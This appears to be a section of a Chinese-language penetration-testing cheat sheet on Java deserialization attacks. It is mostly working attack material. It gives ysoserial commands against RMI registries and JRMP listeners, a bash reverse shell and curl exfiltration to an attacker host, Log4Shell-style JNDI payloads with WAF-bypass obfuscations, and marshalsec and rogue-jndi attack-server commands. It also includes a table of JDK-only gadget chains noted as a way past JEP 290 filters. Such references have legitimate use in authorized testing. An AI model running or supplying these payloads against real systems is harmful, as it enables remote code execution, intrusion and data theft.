## 三、Java 原生反序列化深度

### 3.1 原生协议结构
```
AC ED 00 05            <- magic + version
TC_OBJECT (0x73)       <- 对象标记
TC_CLASSDESC (0x72)    <- 类描述
  className / serialVersionUID / flags / fields...
TC_STRING / TC_REFERENCE ...
```
手工构造要点：`TC_REFERENCE`（引用回溯）、`TC_RESET`（重置句柄表）、`TC_PROXYCLASSDESC`（0x7D，代理类描述——**过滤器绕过关键**，见 7.3）。

### 3.2 JRMP / RMI / IIOP 攻击面
```bash
# RMI Registry 反序列化（1099 端口）：直接向 Registry 接口发送序列化对象
# 工具：ysoserial.exploit.RMIRegistryExploit
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections6 "curl http://attacker/$(whoami)"

# JRMPListener：伪装 JRMP 服务端，目标连入即反序列化（适用"目标主动回连"场景）
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -i >& /dev/tcp/attacker/4444 0>&1"

# JRMPClient：构造触发反向 JRMP 连接的对象（结合 JNDI 使用）
java -cp ysoserial.jar ysoserial.payloads.JRMPClient <attacker> 1099 > jrmp.ser

# IIOP（CORBA）：WebLogic 3700 端口，工具 weblogic_cve_2020_2555 / iiopDeserialize
# 探测：nmap -sV -p 1099,7001,3700,9010 目标
```

### 3.3 JNDI 注入（Log4Shell 类）
```
# 触发点：反序列化链/JNDI lookup/日志格式化/表达式注入中可控的 jndi 引用
${jndi:ldap://attacker.com:1389/obj}
${jndi:rmi://attacker.com:1099/obj}
${jndi:dns://attacker.com/xxx}               # DNS 外带检测
${jndi:ldap://${hostName}.attacker.com/obj}  # 外带主机名

# WAF 绕过变形
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/obj}
${${::-j}ndi:ldap://attacker.com/obj}
${${env:FOO:-j}ndi:ldap://attacker.com/obj}
%24%7Bjndi:ldap://attacker.com/obj%7D

# JDK 版本决定可利用性（关键矩阵）：
# RMI 远程 codebase:      JDK <= 8u121   （更高需 Rogue-JNDI 本地工厂绕过）
# LDAP 远程 codebase:     JDK <= 8u191
# 高版本 JDK：需本地 Gadget（如 BeanFactory）或 LDAP 返回序列化数据
# 攻击服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit" 1389
java -jar rogue-jndi.jar -n "ldap://attacker:1389" -c "calc.exe"
```

### 3.4 无依赖 JDK-only 链
| 链 | 触发类 | JDK 版本限制 |
|----|--------|-------------|
| Jdk7u21 | `AnnotationInvocationHandler` + `TemplatesImpl` + `LinkedHashSet` | 7u21-7u51 附近，8u 部分版本（8u20 前） |
| Jdk8u20 | `AnnotationInvocationHandler` + 引用复用 | JDK 8u20 及其后部分版本（被后续修复） |
| Jdk8u21 | `TemplatesImpl` 变体 | 特定 8u 版本 |
**价值**：JEP 290 过滤第三方库时，JDK-only 链往往不受影响（白名单类常被放行）。

